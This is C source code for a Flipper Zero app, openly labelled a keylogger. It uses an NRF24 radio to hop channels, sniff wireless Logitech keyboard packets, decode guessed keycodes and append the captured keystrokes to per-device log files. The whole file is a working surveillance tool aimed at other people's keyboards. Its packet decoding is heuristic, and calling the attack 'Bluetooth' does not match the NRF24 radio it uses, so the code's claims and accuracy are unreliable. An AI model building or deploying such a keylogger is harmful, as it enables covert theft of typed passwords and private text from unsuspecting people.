/**
 * Bluetooth Keylogger para Flipper Zero
 * Captura pulsaciones de teclados Logitech usando NRF24
 * Compatible con firmware Xtreme API 38
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/popup.h>
#include <storage/storage.h>
#include <notification/notification_messages.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "nrf24_driver.h"

#define TAG "BTSniff"
#define LOG_DIR EXT_PATH("logs")
#define MAX_DEVICES 20
#define MAC_STR_LEN 18

typedef enum {
    ViewMenu = 0,
    ViewSniffing,
    ViewDeviceList,
} AppView;

typedef struct {
    uint8_t mac[6];
    char mac_str[MAC_STR_LEN];
    bool selected;
    uint32_t key_count;
    uint32_t packet_count;
} Device;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* menu;
    Submenu* device_list;
    Popup* popup;
    NotificationApp* notifications;
    
    Device devices[MAX_DEVICES];
    uint8_t device_count;
    
    bool running;
    bool sniffing;
    bool scan_all;
    uint32_t current_view;
    
    FuriThread* worker;
    FuriMutex* mutex;
} App;

static void mac_to_str(uint8_t* mac, char* str, bool fmt) {
    if(fmt) {
        snprintf(str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        snprintf(str, MAC_STR_LEN, "%02X%02X%02X%02X%02X%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
}

static const char* hid_to_char(uint8_t code, bool shift) {
    static char buf[2];
    
    if(code >= 0x04 && code <= 0x1D) {
        buf[0] = shift ? ('A' + code - 0x04) : ('a' + code - 0x04);
        buf[1] = 0;
        return buf;
    }
    
    if(code >= 0x1E && code <= 0x27) {
        const char* nums = "1234567890";
        const char* syms = "!@#$%^&*()";
        buf[0] = shift ? syms[code - 0x1E] : nums[code - 0x1E];
        buf[1] = 0;
        return buf;
    }
    
    switch(code) {
        case 0x28: return "\n";
        case 0x2C: return " ";
        case 0x2D: return shift ? "_" : "-";
        case 0x37: return ".";
        default: return "";
    }
}

static Device* find_or_add_device(App* app, uint8_t* mac) {
    // Buscar existente
    for(uint8_t i = 0; i < app->device_count; i++) {
        if(memcmp(app->devices[i].mac, mac, 6) == 0) {
            return &app->devices[i];
        }
    }
    
    // Añadir nuevo
    if(app->device_count < MAX_DEVICES) {
        Device* dev = &app->devices[app->device_count];
        memcpy(dev->mac, mac, 6);
        mac_to_str(mac, dev->mac_str, true);
        dev->selected = false;
        dev->key_count = 0;
        dev->packet_count = 0;
        app->device_count++;
        FURI_LOG_I(TAG, "New device: %s", dev->mac_str);
        return dev;
    }
    
    return NULL;
}

static void save_key(Device* dev, const char* key) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(storage, LOG_DIR);
    
    char path[64];
    char mac_fn[16];
    mac_to_str(dev->mac, mac_fn, false);
    snprintf(path, sizeof(path), "%s/%s.txt", LOG_DIR, mac_fn);
    
    File* file = storage_file_alloc(storage);
    if(storage_file_open(file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_write(file, key, strlen(key));
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static void process_packet(App* app, uint8_t* data, uint8_t len) {
    // Logitech unifying usa paquetes de 10+ bytes
    if(len < 10) return;
    
    // Verificar si parece un paquete de teclado Logitech
    // Los paquetes HID de Logitech tienen estructura específica
    
    // Extraer dirección del dispositivo (primeros 5 bytes suelen ser dirección)
    uint8_t mac[6];
    memcpy(mac, data, 5);
    mac[5] = data[5] & 0x0F;  // Usar parte del 6to byte
    
    Device* dev = find_or_add_device(app, mac);
    if(!dev) return;
    
    dev->packet_count++;
    
    // Solo guardar si está seleccionado o modo scan_all
    if(!app->scan_all && !dev->selected) return;
    
    // Buscar datos HID en el paquete
    // Logitech suele tener los datos de tecla después del header
    for(int offset = 2; offset < len - 2; offset++) {
        // Buscar patrón de reporte HID
        if(data[offset] == 0x00 || data[offset] > 0x65) continue;
        
        uint8_t keycode = data[offset];
        if(keycode >= 0x04 && keycode <= 0x38) {
            bool shift = false;
            // Buscar modificadores cerca
            if(offset > 0) {
                shift = (data[offset-1] & 0x22) != 0;
            }
            
            const char* key = hid_to_char(keycode, shift);
            if(key[0]) {
                save_key(dev, key);
                dev->key_count++;
                FURI_LOG_D(TAG, "Key: %s from %s", key, dev->mac_str);
            }
        }
    }
}

static int32_t worker_thread(void* ctx) {
    App* app = ctx;
    
    FURI_LOG_I(TAG, "Worker starting...");
    
    if(!nrf24_init()) {
        FURI_LOG_E(TAG, "NRF24 init failed!");
        return -1;
    }
    
    FURI_LOG_I(TAG, "NRF24 initialized, scanning...");
    
    uint8_t buf[32];
    uint8_t len;
    uint8_t pipe;
    uint8_t channel = 25;  // Canal inicial para Logitech
    uint32_t last_hop = 0;
    
    // Logitech usa varios canales, hacer hop
    uint8_t logitech_channels[] = {2, 5, 8, 14, 17, 20, 23, 26, 29, 32, 35, 38, 41, 44, 47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80};
    uint8_t ch_idx = 0;
    
    while(app->running && app->sniffing) {
        // Channel hopping cada 5ms
        uint32_t now = furi_get_tick();
        if(now - last_hop > 5) {
            ch_idx = (ch_idx + 1) % sizeof(logitech_channels);
            nrf24_set_channel(logitech_channels[ch_idx]);
            last_hop = now;
        }
        
        if(nrf24_available()) {
            if(nrf24_read(buf, &len, &pipe)) {
                FURI_LOG_D(TAG, "RX %d bytes on CH%d", len, logitech_channels[ch_idx]);
                
                if(furi_mutex_acquire(app->mutex, 10) == FuriStatusOk) {
                    process_packet(app, buf, len);
                    furi_mutex_release(app->mutex);
                }
            }
        }
        
        furi_delay_us(100);
    }
    
    nrf24_deinit();
    FURI_LOG_I(TAG, "Worker stopped");
    return 0;
}

static void menu_callback(void* ctx, uint32_t idx);

static void update_device_list(App* app) {
    submenu_reset(app->device_list);
    
    for(uint8_t i = 0; i < app->device_count; i++) {
        char item[48];
        snprintf(item, sizeof(item), "%s%s [%lu]", 
            app->devices[i].selected ? "*" : " ",
            app->devices[i].mac_str,
            app->devices[i].key_count);
        submenu_add_item(app->device_list, item, i + 10, menu_callback, app);
    }
    
    if(app->device_count == 0) {
        submenu_add_item(app->device_list, "Sin dispositivos", 100, NULL, NULL);
        submenu_add_item(app->device_list, "(Escanea primero)", 101, NULL, NULL);
    }
}

static void start_worker(App* app) {
    if(app->sniffing) return;
    
    app->sniffing = true;
    app->running = true;
    
    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "BTWorker");
    furi_thread_set_stack_size(app->worker, 4096);
    furi_thread_set_callback(app->worker, worker_thread);
    furi_thread_set_context(app->worker, app);
    furi_thread_start(app->worker);
}

static void stop_worker(App* app) {
    if(!app->sniffing) return;
    
    app->sniffing = false;
    app->running = false;
    
    if(app->worker) {
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
        app->worker = NULL;
    }
}

static void menu_callback(void* ctx, uint32_t idx) {
    App* app = ctx;
    
    if(idx == 0) {  // Escanear
        app->scan_all = true;
        start_worker(app);
        notification_message(app->notifications, &sequence_blink_start_blue);
        app->current_view = ViewSniffing;
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewSniffing);
    }
    else if(idx == 1) {  // Dispositivos
        update_device_list(app);
        app->current_view = ViewDeviceList;
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewDeviceList);
    }
    else if(idx == 2) {  // Detener
        stop_worker(app);
        notification_message(app->notifications, &sequence_blink_stop);
    }
    else if(idx >= 10 && idx < 10 + MAX_DEVICES) {  // Toggle device
        uint8_t dev_idx = idx - 10;
        if(dev_idx < app->device_count) {
            app->devices[dev_idx].selected = !app->devices[dev_idx].selected;
            
            if(!app->sniffing) {
                app->scan_all = false;
                start_worker(app);
            }
            
            update_device_list(app);
            notification_message(app->notifications, &sequence_single_vibro);
        }
    }
}

static bool nav_callback(void* ctx) {
    App* app = ctx;
    
    if(app->current_view == ViewMenu) {
        return false;
    }
    
    app->current_view = ViewMenu;
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    return true;
}

static App* app_alloc(void) {
    App* app = malloc(sizeof(App));
    memset(app, 0, sizeof(App));
    
    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, nav_callback);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    
    // Menu principal
    app->menu = submenu_alloc();
    submenu_add_item(app->menu, "Escanear", 0, menu_callback, app);
    submenu_add_item(app->menu, "Dispositivos", 1, menu_callback, app);
    submenu_add_item(app->menu, "Detener", 2, menu_callback, app);
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu, submenu_get_view(app->menu));
    
    // Popup de sniffing
    app->popup = popup_alloc();
    popup_set_header(app->popup, "Escaneando...", 64, 20, AlignCenter, AlignBottom);
    popup_set_text(app->popup, "Buscando teclados\nLogitech\n\nBACK = volver", 64, 35, AlignCenter, AlignTop);
    view_dispatcher_add_view(app->view_dispatcher, ViewSniffing, popup_get_view(app->popup));
    
    // Lista de dispositivos
    app->device_list = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, ViewDeviceList, submenu_get_view(app->device_list));
    
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->current_view = ViewMenu;
    
    // Crear carpeta logs
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(storage, LOG_DIR);
    furi_record_close(RECORD_STORAGE);
    
    return app;
}

static void app_free(App* app) {
    stop_worker(app);
    
    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewSniffing);
    view_dispatcher_remove_view(app->view_dispatcher, ViewDeviceList);
    
    submenu_free(app->menu);
    submenu_free(app->device_list);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    
    furi_mutex_free(app->mutex);
    
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);
    
    free(app);
}

int32_t bt_keylogger_app(void* p) {
    UNUSED(p);
    
    App* app = app_alloc();
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);
    app_free(app);
    
    return 0;
}
